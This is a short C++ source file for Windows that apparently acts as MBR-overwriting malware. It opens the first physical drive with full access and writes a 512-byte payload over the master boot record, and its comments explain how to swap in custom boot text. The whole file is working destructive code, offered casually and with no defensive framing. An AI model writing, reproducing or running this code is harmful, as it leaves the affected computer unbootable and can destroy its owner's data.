#include <Windows.h>
#include <iostream>
#include "byte.h"

/*
To make it print your own text change the one in gay.asm
convert to bin with any compiler like nasm and then to hex byte array :thumbs_up:
Change in byte.h
*/
int main(){
	DWORD dwBytesWritten;
	//handle for mbr :thumbs_up:
	HANDLE mhandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, NULL, NULL);
	//write new data to handle or whatever
	if (WriteFile(mhandle, newmbrdata, 512, &dwBytesWritten, 0) == TRUE){
		std::cout << "gg(get gooder) :3" << std::endl;
		//Sillyness overload
		Sleep(5000);
		ExitProcess(0);
	} else
	{
		std::cout << "Oh no :( something else is accessing PhysicalDrive0";
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(mhandle);
	return EXIT_SUCCESS;
}